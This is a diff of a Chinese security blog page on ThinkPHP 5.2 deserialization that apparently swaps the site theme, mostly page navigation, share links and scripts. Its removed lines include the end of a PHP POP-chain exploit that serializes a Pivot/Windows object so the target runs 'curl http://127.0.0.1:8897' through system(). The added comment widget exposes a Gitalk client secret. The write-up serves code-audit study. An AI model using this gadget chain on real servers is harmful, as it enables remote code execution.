-    &#125;
+<h1 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./last.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
 
-    <span class="hljs-keyword">trait</span> Attribute&#123;
-        <span class="hljs-keyword">private</span> $withAttr;
-        <span class="hljs-keyword">private</span> $data;
-    &#125;
-&#125;
 
-<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span> &#123;
-    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Model</span>&#123;
-        <span class="hljs-title">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">RelationShip</span>;
-        <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Conversion</span>;
-        <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;
 
-        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($closure)</span></span>
-<span class="hljs-function">        </span>&#123;
-            <span class="hljs-keyword">$this</span>-&gt;data = $closure;
-            <span class="hljs-keyword">$this</span>-&gt;relation = [];
-            <span class="hljs-keyword">$this</span>-&gt;visible= [];
-            <span class="hljs-keyword">$this</span>-&gt;withAttr = <span class="hljs-keyword">array</span>(<span class="hljs-string">"paper"</span>=&gt;<span class="hljs-string">'system'</span>);
-        &#125;
-    &#125;
-&#125;
 
-<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span> &#123;
-    <span class="hljs-title">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-title">extends</span> \<span class="hljs-title">think</span>\<span class="hljs-title">Model</span>&#123;
-        <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>($<span class="hljs-title">closure</span>)
-        &#123;
-            <span class="hljs-title">parent</span>::<span class="hljs-title">__construct</span>($<span class="hljs-title">closure</span>);
-        &#125;
-    &#125;
-&#125;
-<span class="hljs-keyword">namespace</span>&#123;
-    $pivot = new think\model\Pivot(['paper'=&gt;'curl http://127.0.0.1:8897']);
-    $windows = <span class="hljs-keyword">new</span> think\process\pipes\Windows([$pivot]);
-    <span class="hljs-keyword">echo</span> urlencode(serialize($windows));
-&#125;</code></pre>
 
-<p><img src="./1569947445551.png" srcset="/img/loading.gif" alt="1569947445551"></p>
-<h1 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h1><p><img src="./last.jpg" srcset="/img/loading.gif" alt=""></p>
+
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/187332#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187332#h2-2</a></p>
 
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
-                    
-                  </div>
-                
-              </div>
-              
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext row">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2019/10/02/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ThinkPHP 6.0.x反序列化</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2019/09/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%8D%95%E9%93%BE%E8%A1%A8%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/">
-                        <span class="hidden-mobile">数据结构 | 单链表增删改查</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-05-15T08:25:48.000Z" itemprop="dateUpdated">2020-05-15 16:25:48</time>
+</span><br>
+
+
+        
+        玩的开心
+        
+    </div>
+    
+    <footer>
+        <a href="http://zhzhdoai.github.io">
+            <img src="/img/avatar.jpg" alt="osword">
+            osword
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+
 
             
-          </article>
-        </div>
-      </div>
-    </div>
+<div class="page-share-wrap">
     
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div id="tocbot"></div>
-</div>
 
-      </div>
-    
-  </div>
-</div>
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=《ThinkPHP 5.2反序列化》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=《ThinkPHP 5.2反序列化》 — osword's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ThinkPHP 5.2反序列化》 — osword's blog&url=http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&via=http://zhzhdoai.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
 
-<!-- Custom -->
 
 
-    
-  </main>
-
-  
-    <a id="scroll-top-button" href="#" role="button">
-      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
     </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
 </div>
-  
 
-  
 
-  
 
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <div>
-      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
-      <i class="iconfont icon-love"></i>
-      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
-        <span>Fluid</span></a>
+        </div>
     </div>
+
     
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/10/02/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">ThinkPHP 6.0.x反序列化</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/09/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%8D%95%E9%93%BE%E8%A1%A8%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">数据结构 | 单链表增删改查</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
 
     
 
-    
-  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script src="/js/md5.min.js"></script>
+    <script>
+        var gitalk = new Gitalk({
+            clientID: '7d7576c71632f14d639a',
+            clientSecret: '3d7f7e4c0e9a43a2cc5334d68aee612090df8b70',
+            repo: 'zhzhdoai.github.io',
+            owner: 'zhzhdoai',
+            admin: 'zhzhdoai',
+            id: md5(location.pathname),
+            perPage: 50,
+            distractionFreeMode: 'false'
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>osword &copy; 2015 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
 </footer>
 
-<!-- SCRIPTS -->
-<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
-<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/main.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
 
 
 
-  
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=《ThinkPHP 5.2反序列化》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=《ThinkPHP 5.2反序列化》 — osword's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ThinkPHP 5.2反序列化》 — osword's blog&url=http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&via=http://zhzhdoai.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" alt="微信分享二维码">
+</div>
 
 
 
-  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
-  <script  src="/js/clipboard-use.js" ></script>
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
 
 
 
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
-  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
 
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: '#post-body',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        collapseDepth: 0,
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc').css('visibility', 'visible');
-      }
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
     });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "ThinkPHP 5.2反序列化&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      searchFunc(path, 'local-search-input', 'local-search-result');
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-  <script>
-    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
-      function () {
-        var element = document.createElement('a');
-        $(element).attr('data-fancybox', 'images');
-        $(element).attr('href', $(this).attr('src'));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+})();
+</script>
 
 
 
